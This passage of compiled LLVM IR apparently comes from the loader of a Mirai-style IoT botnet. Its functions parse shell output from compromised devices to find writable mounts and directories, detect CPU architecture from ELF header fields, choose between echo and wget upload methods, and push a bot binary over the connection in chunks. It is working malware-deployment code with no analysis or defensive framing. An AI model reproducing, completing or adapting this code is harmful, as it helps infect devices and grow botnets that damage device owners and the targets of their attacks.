  %or.cond3 = and i1 %36, %37
  br i1 %or.cond3, label %38, label %.thread

; <label>:38:                                     ; preds = %._crit_edge
  %39 = tail call i32 @atoi(i8* nonnull %.299) #9
  %40 = tail call i64 @strlen(i8* nonnull %.2) #9
  %41 = trunc i64 %40 to i32
  %42 = icmp eq i32 %39, 1
  br i1 %42, label %.thread, label %43

; <label>:43:                                     ; preds = %38
  %44 = tail call i32 @strcmp(i8* nonnull %.2, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #9
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %49, label %46

; <label>:46:                                     ; preds = %43
  %47 = tail call i32 @strcmp(i8* nonnull %.2, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0)) #9
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %52

; <label>:49:                                     ; preds = %46, %43
  %50 = load i32, i32* %8, align 8
  %51 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %50, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %39)
  br label %.thread

; <label>:52:                                     ; preds = %46
  %53 = icmp sgt i32 %39, 400
  %54 = icmp sgt i32 %41, 0
  %or.cond = and i1 %53, %54
  br i1 %or.cond, label %.lr.ph131.preheader, label %.thread

.lr.ph131.preheader:                              ; preds = %52
  %sext = shl i64 %40, 32
  %55 = ashr exact i64 %sext, 32
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %65
  %indvars.iv136 = phi i64 [ 0, %.lr.ph131.preheader ], [ %indvars.iv.next137, %65 ]
  %.091130 = phi i32 [ 0, %.lr.ph131.preheader ], [ %.1, %65 ]
  %56 = getelementptr inbounds i8, i8* %.2, i64 %indvars.iv136
  %57 = load i8, i8* %56, align 1
  %.off = add i8 %57, -48
  %58 = icmp ult i8 %.off, 10
  br i1 %58, label %59, label %61

; <label>:59:                                     ; preds = %.lr.ph131
  %60 = add nsw i32 %.091130, 1
  br label %65

; <label>:61:                                     ; preds = %.lr.ph131
  %62 = and i8 %57, -33
  %63 = add i8 %62, -65
  %64 = icmp ult i8 %63, 26
  br i1 %64, label %.thread.loopexit, label %65

; <label>:65:                                     ; preds = %61, %59
  %.1 = phi i32 [ %60, %59 ], [ %.091130, %61 ]
  %indvars.iv.next137 = add nuw nsw i64 %indvars.iv136, 1
  %66 = icmp slt i64 %indvars.iv.next137, %55
  br i1 %66, label %.lr.ph131, label %._crit_edge132

._crit_edge132:                                   ; preds = %65
  %67 = icmp sgt i32 %.1, 0
  br i1 %67, label %68, label %.thread

; <label>:68:                                     ; preds = %._crit_edge132
  %69 = load i32, i32* %9, align 8
  %70 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %69, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %39)
  br label %.thread

.thread.loopexit:                                 ; preds = %61
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %22, %38, %49, %._crit_edge132, %68, %52, %._crit_edge
  %71 = getelementptr inbounds i8, i8* %19, i64 1
  br label %72

; <label>:72:                                     ; preds = %18, %21, %.thread
  %.194 = phi i8* [ %.093, %21 ], [ %71, %.thread ], [ %.093, %18 ]
  %indvars.iv.next139 = add nuw i64 %indvars.iv138, 1
  br label %10

; <label>:73:                                     ; preds = %14
  %74 = load i16, i16* %3, align 8
  br i1 %7, label %76, label %.preheader

.preheader:                                       ; preds = %73
  %75 = icmp eq i16 %74, 0
  br i1 %75, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:76:                                     ; preds = %73
  %77 = icmp ugt i16 %74, 7168
  br i1 %77, label %78, label %.loopexit

; <label>:78:                                     ; preds = %76
  %79 = zext i16 %74 to i64
  %80 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 6144
  %81 = add nsw i64 %79, -6144
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %2, i8* %80, i64 %81, i32 1, i1 false)
  %82 = load i16, i16* %3, align 8
  %83 = add i16 %82, -6144
  store i16 %83, i16* %3, align 8
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %88
  %indvars.iv = phi i64 [ %indvars.iv.next, %88 ], [ 0, %.lr.ph.preheader ]
  %84 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %85 = load i8, i8* %84, align 1
  %86 = icmp eq i8 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %.lr.ph
  store i8 32, i8* %84, align 1
  br label %88

; <label>:88:                                     ; preds = %.lr.ph, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %89 = load i16, i16* %3, align 8
  %90 = zext i16 %89 to i64
  %91 = icmp slt i64 %indvars.iv.next, %90
  br i1 %91, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %88
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %76, %78
  %.092 = phi i32 [ 0, %78 ], [ 0, %76 ], [ %6, %.preheader ], [ %6, %.loopexit.loopexit ]
  ret i32 %.092
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_mounts(%struct.connection* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [256 x i8], align 16
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %5 = load i16, i16* %4, align 8
  %6 = zext i16 %5 to i32
  %7 = tail call i32 @util_memsearch(i8* %3, i32 %6, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %62, label %.preheader

.preheader:                                       ; preds = %1
  %9 = icmp sgt i32 %7, 0
  br i1 %9, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 0
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %12 = sext i32 %7 to i64
  br label %13

; <label>:13:                                     ; preds = %.lr.ph, %55
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %55 ]
  %.03844 = phi i32 [ 0, %.lr.ph ], [ %.1, %55 ]
  %.03943 = phi i32 [ 0, %.lr.ph ], [ %.140, %55 ]
  %14 = sext i32 %.03844 to i64
  %15 = icmp eq i32 %.03844, 255
  br i1 %15, label %._crit_edge.loopexit, label %16

; <label>:16:                                     ; preds = %13
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %18 = load i8, i8* %17, align 1
  switch i8 %18, label %52 [
    i8 10, label %19
    i8 32, label %45
    i8 9, label %45
    i8 13, label %55
  ]

; <label>:19:                                     ; preds = %16
  %20 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 0, i8* %20, align 1
  %21 = call i8* @strtok(i8* nonnull %10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %22 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %23 = icmp eq i8* %22, null
  br i1 %23, label %55, label %24

; <label>:24:                                     ; preds = %19
  %25 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %26 = icmp eq i8* %25, null
  br i1 %26, label %55, label %27

; <label>:27:                                     ; preds = %24
  %28 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %29 = icmp eq i8* %28, null
  br i1 %29, label %55, label %30

; <label>:30:                                     ; preds = %27
  %31 = call i64 @strlen(i8* nonnull %22) #9
  %32 = add i64 %31, -1
  %33 = getelementptr inbounds i8, i8* %22, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = icmp eq i8 %34, 47
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i8 0, i8* %33, align 1
  br label %37

; <label>:37:                                     ; preds = %36, %30
  %38 = call i64 @strlen(i8* nonnull %28) #9
  %39 = trunc i64 %38 to i32
  %40 = call i32 @util_memsearch(i8* nonnull %28, i32 %39, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i32 2)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %55, label %42

; <label>:42:                                     ; preds = %37
  %43 = load i32, i32* %11, align 8
  %44 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %43, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i8* nonnull %22, i8* nonnull %22, i8* nonnull %22, i8* nonnull %22, i8* nonnull %22)
  br label %55

; <label>:45:                                     ; preds = %16, %16
  %46 = add nsw i32 %.03943, 1
  %47 = icmp eq i32 %.03943, 0
  br i1 %47, label %48, label %55

; <label>:48:                                     ; preds = %45
  %49 = load i8, i8* %17, align 1
  %50 = add nsw i32 %.03844, 1
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 %49, i8* %51, align 1
  br label %55

; <label>:52:                                     ; preds = %16
  %53 = add nsw i32 %.03844, 1
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 %18, i8* %54, align 1
  br label %55

; <label>:55:                                     ; preds = %16, %19, %24, %27, %42, %37, %52, %45, %48
  %.140 = phi i32 [ %46, %48 ], [ %46, %45 ], [ 0, %52 ], [ %.03943, %37 ], [ %.03943, %42 ], [ %.03943, %27 ], [ %.03943, %24 ], [ %.03943, %19 ], [ %.03943, %16 ]
  %.1 = phi i32 [ %50, %48 ], [ %.03844, %45 ], [ %53, %52 ], [ 0, %37 ], [ 0, %42 ], [ 0, %27 ], [ 0, %24 ], [ 0, %19 ], [ %.03844, %16 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %56 = icmp slt i64 %indvars.iv.next, %12
  br i1 %56, label %13, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %13, %55
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %58 = load i32, i32* %57, align 8
  %59 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %58, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0))
  %60 = load i32, i32* %57, align 8
  %61 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %60, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i64 0, i64 0))
  br label %62

; <label>:62:                                     ; preds = %1, %._crit_edge
  %.0 = phi i32 [ %7, %._crit_edge ], [ 0, %1 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %9 = tail call i32 @util_memsearch(i8* %8, i32 %6, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %.loopexit, label %.lr.ph.lr.ph

.lr.ph.lr.ph:                                     ; preds = %.preheader
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 3, i64 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.lr.ph, %.outer.backedge
  %13 = phi i32 [ %9, %.lr.ph.lr.ph ], [ %46, %.outer.backedge ]
  %.026.ph33 = phi i32 [ 0, %.lr.ph.lr.ph ], [ %17, %.outer.backedge ]
  %.027.ph32 = phi i8 [ 0, %.lr.ph.lr.ph ], [ %.027.ph.be, %.outer.backedge ]
  %14 = icmp eq i8 %.027.ph32, 0
  br label %15

; <label>:15:                                     ; preds = %.lr.ph, %.backedge
  %16 = phi i32 [ %13, %.lr.ph ], [ %25, %.backedge ]
  %.02630 = phi i32 [ %.026.ph33, %.lr.ph ], [ %17, %.backedge ]
  %17 = add nsw i32 %16, %.02630
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %18
  %20 = tail call i8* @strtok(i8* %19, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0)) #7
  %21 = icmp eq i8* %20, null
  br i1 %21, label %.backedge, label %27

.backedge:                                        ; preds = %15, %35
  %22 = sext i32 %17 to i64
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %22
  %24 = sub nsw i32 %6, %17
  %25 = tail call i32 @util_memsearch(i8* %23, i32 %24, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %.loopexit.loopexit, label %15

; <label>:27:                                     ; preds = %15
  %28 = tail call i64 @strlen(i8* nonnull %20) #9
  %29 = shl i64 %28, 32
  %sext = add i64 %29, -4294967296
  %30 = ashr exact i64 %sext, 32
  %31 = getelementptr inbounds i8, i8* %20, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 13
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %27
  store i8 0, i8* %31, align 1
  br label %35

; <label>:35:                                     ; preds = %34, %27
  %36 = load i32, i32* %11, align 8
  %37 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %36, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i64 0, i64 0), i8* nonnull %20, i8* nonnull %20, i8* nonnull %20)
  br i1 %14, label %38, label %.backedge

; <label>:38:                                     ; preds = %35
  %39 = trunc i64 %28 to i32
  %40 = icmp slt i32 %39, 31
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %38
  %42 = tail call i8* @strcpy(i8* nonnull %12, i8* nonnull %20) #7
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %41, %48
  %.027.ph.be = phi i8 [ 0, %48 ], [ 1, %41 ]
  %43 = sext i32 %17 to i64
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %43
  %45 = sub nsw i32 %6, %17
  %46 = tail call i32 @util_memsearch(i8* %44, i32 %45, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %.loopexit.loopexit49, label %.lr.ph

; <label>:48:                                     ; preds = %38
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %.outer.backedge

.loopexit.loopexit:                               ; preds = %.backedge
  br label %.loopexit

.loopexit.loopexit49:                             ; preds = %.outer.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit49, %.loopexit.loopexit, %.preheader, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %.preheader ], [ %6, %.loopexit.loopexit ], [ %6, %.loopexit.loopexit49 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_copy_op(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 8
  %3 = load i8, i8* %2, align 1
  %4 = icmp eq i8 %3, 0
  %5 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  br i1 %4, label %9, label %56

; <label>:9:                                      ; preds = %1
  %10 = tail call i32 @util_memsearch(i8* %5, i32 %8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i32 3)
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %67, label %12

; <label>:12:                                     ; preds = %9
  %13 = add nsw i32 %10, -4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %14
  store i8 1, i8* %2, align 1
  %16 = getelementptr inbounds i8, i8* %15, i64 5
  %17 = load i8, i8* %16, align 1
  switch i8 %17, label %25 [
    i8 0, label %67
    i8 2, label %18
  ]

; <label>:18:                                     ; preds = %12
  %19 = getelementptr inbounds i8, i8* %15, i64 18
  %20 = bitcast i8* %19 to i16*
  %21 = load i16, i16* %20, align 1
  %22 = zext i16 %21 to i32
  %23 = tail call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %22) #7
  %24 = trunc i32 %23 to i16
  store i16 %24, i16* %20, align 1
  br label %25

; <label>:25:                                     ; preds = %18, %12
  %26 = getelementptr inbounds i8, i8* %15, i64 18
  %27 = bitcast i8* %26 to i16*
  %28 = load i16, i16* %27, align 1
  switch i16 %28, label %49 [
    i16 40, label %29
    i16 183, label %29
    i16 8, label %32
    i16 10, label %32
    i16 3, label %38
    i16 6, label %38
    i16 7, label %38
    i16 62, label %38
    i16 2, label %41
    i16 18, label %41
    i16 43, label %41
    i16 4, label %44
    i16 5, label %44
    i16 20, label %46
    i16 21, label %46
  ]

; <label>:29:                                     ; preds = %25, %25
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %31 = bitcast i8* %30 to i32*
  store i32 7172705, i32* %31, align 1
  br label %67

; <label>:32:                                     ; preds = %25, %25
  %33 = load i8, i8* %16, align 1
  %34 = icmp eq i8 %33, 1
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  br i1 %34, label %36, label %37

; <label>:36:                                     ; preds = %32
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %67

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %67

; <label>:38:                                     ; preds = %25, %25, %25, %25
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %40 = bitcast i8* %39 to i32*
  store i32 3553400, i32* %40, align 1
  br label %67

; <label>:41:                                     ; preds = %25, %25, %25
  %42 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %43 = bitcast i8* %42 to i32*
  store i32 6516851, i32* %43, align 1
  br label %67

; <label>:44:                                     ; preds = %25, %25
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %45, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %67

; <label>:46:                                     ; preds = %25, %25
  %47 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %48 = bitcast i8* %47 to i32*
  store i32 6516848, i32* %48, align 1
  br label %67

; <label>:49:                                     ; preds = %25
  %50 = icmp eq i16 %28, 42
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2
  br i1 %50, label %52, label %54

; <label>:52:                                     ; preds = %49
  %53 = bitcast [6 x i8]* %51 to i32*
  store i32 3434611, i32* %53, align 1
  br label %67

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds [6 x i8], [6 x i8]* %51, i64 0, i64 0
  store i8 0, i8* %55, align 8
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %67

; <label>:56:                                     ; preds = %1
  %57 = tail call i32 @util_memsearch(i8* %5, i32 %8, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %67

; <label>:59:                                     ; preds = %56
  %60 = icmp ugt i16 %7, 7168
  br i1 %60, label %61, label %67

; <label>:61:                                     ; preds = %59
  %62 = zext i16 %7 to i64
  %63 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 6144
  %64 = add nsw i64 %62, -6144
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %5, i8* %63, i64 %64, i32 1, i1 false)
  %65 = load i16, i16* %6, align 8
  %66 = add i16 %65, -6144
  store i16 %66, i16* %6, align 8
  br label %67

; <label>:67:                                     ; preds = %37, %36, %41, %46, %54, %52, %44, %38, %29, %61, %59, %56, %12, %9
  %.0 = phi i32 [ 0, %9 ], [ 0, %12 ], [ %57, %56 ], [ 0, %59 ], [ 0, %61 ], [ 0, %29 ], [ 0, %38 ], [ 0, %44 ], [ 0, %52 ], [ 0, %54 ], [ 0, %46 ], [ 0, %41 ], [ 0, %36 ], [ 0, %37 ]
  ret i32 %.0
}

declare i32 @htons(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection* nocapture) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %16, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i64 0, i64 0), i32 5)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %8
  %12 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i64 0, i64 0), i32 5)
  %13 = icmp eq i32 %12, -1
  br i1 %13, label %16, label %14

; <label>:14:                                     ; preds = %11, %8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i64 0, i64 0), i64 5, i32 1, i1 false)
  br label %16

; <label>:16:                                     ; preds = %14, %11, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %11 ], [ %6, %14 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection* nocapture) local_unnamed_addr #6 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %17, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i64 0, i64 0), i32 22)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %11, label %13

; <label>:11:                                     ; preds = %8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 6
  store i32 1, i32* %12, align 8
  br label %17

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i64 0, i64 0), i32 22)
  %15 = icmp eq i32 %14, -1
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 6
  %.sink = select i1 %15, i32 2, i32 0
  store i32 %.sink, i32* %16, align 8
  br label %17

; <label>:17:                                     ; preds = %11, %13, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %13 ], [ %6, %11 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %39, label %8

; <label>:8:                                      ; preds = %1
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 2
  %10 = load %struct.binary*, %struct.binary** %9, align 8
  %11 = icmp eq %struct.binary* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %8
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %39

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 5
  %15 = load i32, i32* %14, align 4
  %16 = getelementptr inbounds %struct.binary, %struct.binary* %10, i64 0, i32 1
  %17 = load i32, i32* %16, align 8
  %18 = icmp eq i32 %15, %17
  br i1 %18, label %39, label %19

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = getelementptr inbounds %struct.binary, %struct.binary* %10, i64 0, i32 2
  %23 = load i8**, i8*** %22, align 8
  %24 = sext i32 %15 to i64
  %25 = getelementptr inbounds i8*, i8** %23, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = icmp eq i32 %15, 0
  %28 = select i1 %27, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i64 0, i64 0)
  %29 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %21, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i64 0, i64 0), i8* %26, i8* %28)
  %30 = load i32, i32* %14, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %14, align 4
  %32 = sext i32 %6 to i64
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %32
  %34 = load i16, i16* %3, align 8
  %35 = zext i16 %34 to i32
  %36 = sub nsw i32 %35, %6
  %37 = sext i32 %36 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %2, i8* %33, i64 %37, i32 1, i1 false)
  %38 = trunc i32 %36 to i16
  store i16 %38, i16* %3, align 8
  br label %39

; <label>:39:                                     ; preds = %13, %1, %19, %12
  %.0 = phi i32 [ 0, %12 ], [ 0, %19 ], [ 0, %1 ], [ %6, %13 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_upload_wget(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
